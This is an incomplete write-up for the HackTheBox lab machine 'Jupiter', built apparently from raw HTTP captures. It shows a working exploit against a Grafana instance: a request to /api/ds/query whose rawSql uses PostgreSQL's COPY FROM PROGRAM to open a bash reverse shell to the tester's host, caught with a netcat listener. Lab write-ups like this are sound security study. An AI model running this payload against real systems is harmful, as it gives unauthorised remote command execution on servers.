# HackTheBox — Jupiter

![OS: Linux](https://img.shields.io/badge/OS-Linux-blue)
![Difficulty: Medium](https://img.shields.io/badge/Difficulty-Medium-yellow)
![Tags: grafana, sqli, postgres-rce](https://img.shields.io/badge/Tags-Grafana%20%7C%20SQLi%20%7C%20Postgres%20RCE-orange)

> 🚧 **[heavily incomplete — original notes contain only raw HTTP captures with no narrative]**
>
> The captures preserved below show the box involves a Grafana instance on `kiosk.jupiter.htb` connected to a PostgreSQL data source, exploited via the data-source query endpoint to call `COPY ... FROM PROGRAM` for RCE. The full chain (recon, foothold, user, privesc, root) needs to be written up.

---

## Attack Chain at a Glance

```
🚧 [unknown — needs reconnaissance write-up]
   → kiosk.jupiter.htb subdomain (Grafana)
   → POST /api/datasources gives PostgreSQL data source on localhost:5432
     as grafana_viewer (db: moon_namesdb)
   → POST /api/ds/query with rawSql containing
     "COPY cmd_exec FROM PROGRAM '...'" → RCE as postgres
   → 🚧 [user]
   → 🚧 [privesc]
   → 🚧 [root]
```

---

## Reconnaissance

> 🚧 **[incomplete]** — no nmap, gobuster, or vhost enumeration captured in original notes.

Hostname involved: **`kiosk.jupiter.htb`**.

---

## Initial Foothold — Grafana Datasource RCE

### Discovering the PostgreSQL Datasource

A request to Grafana's datasource API returned:

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 13 Jul 2023 04:09:37 GMT
Content-Type: application/json
Content-Length: 368
Cache-Control: no-store
X-Content-Type-Options: nosniff
X-Frame-Options: deny
X-Xss-Protection: 1; mode=block
```

```json
[{
    "id": 1,
    "uid": "YItSLg-Vz",
    "orgId": 1,
    "name": "PostgreSQL",
    "type": "postgres",
    "typeName": "PostgreSQL",
    "typeLogoUrl": "public/app/plugins/datasource/postgres/img/postgresql_logo.svg",
    "access": "proxy",
    "url": "localhost:5432",
    "user": "grafana_viewer",
    "database": "",
    "basicAuth": false,
    "isDefault": true,
    "jsonData": {
        "database": "moon_namesdb",
        "sslmode": "disable"
    },
    "readOnly": false
}]
```

> 🚧 **[gap]** — how this endpoint was reached (auth required? `/api/datasources` is normally restricted to admins; the `viewer` role typically can't list datasources unless misconfigured).

### Exploiting via /api/ds/query

PostgreSQL's `COPY ... FROM PROGRAM` runs an arbitrary shell command as the postgres user:

```http
POST /api/ds/query HTTP/1.1
Host: kiosk.jupiter.htb
Accept: application/json
Content-Type: application/json
Content-Length: 493

{
   "queries": [
      {
         "refId": "A",
         "scenarioId": "csv_metric_values",
         "datasource": {
            "uid": "YItSLg-Vz",
            "type": "postgres"
         },
         "rawSql": "CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/10.10.14.153/1337 0>&1\"'",
         "format": "table",
         "datasourceId": 1,
         "maxDataPoints": 60000,
         "intervalMs": 940
      }
   ],
   "from": "now-5m",
   "to": "now"
}
```

> 💡 **Why this works:** Grafana proxies the `rawSql` straight to the configured datasource. PostgreSQL's `COPY FROM PROGRAM` (when the connection user has the `pg_execute_server_program` role, which `postgres` does by default) runs the supplied command as the OS user the postgres server is running as.

Set up `nc -lvnp 1337` before issuing the request.

---

## User Flag

> 🚧 **[incomplete]** — landing user, lateral movement to user-flag-bearing account, and `user.txt` itself not in original notes.

---

## Privilege Escalation

> 🚧 **[incomplete]** — privesc path not in original notes. Common Jupiter privesc references involve a Jupyter notebook running as a privileged user with a writable kernel script — but that's not confirmed from these notes.

---

## Root Flag

> 🚧 **[incomplete]**

---

## Lessons Learned

> 🚧 **[incomplete]**. Candidate themes (to be confirmed against full chain):
> - Grafana datasources expose raw query interfaces; if a `proxy`-mode datasource is exposed and you can reach `/api/ds/query`, you're effectively the DB user.
> - PostgreSQL's `COPY FROM PROGRAM` is RCE-equivalent for any session with `pg_execute_server_program` — which `postgres` has, and many DB admin accounts inherit.

---

## Tools Referenced

| Tool | Purpose |
|------|---------|
| [Burp Suite](https://portswigger.net/burp) | Crafting and replaying the Grafana API requests |
| [PostgreSQL `COPY FROM PROGRAM`](https://www.postgresql.org/docs/current/sql-copy.html) | RCE primitive |
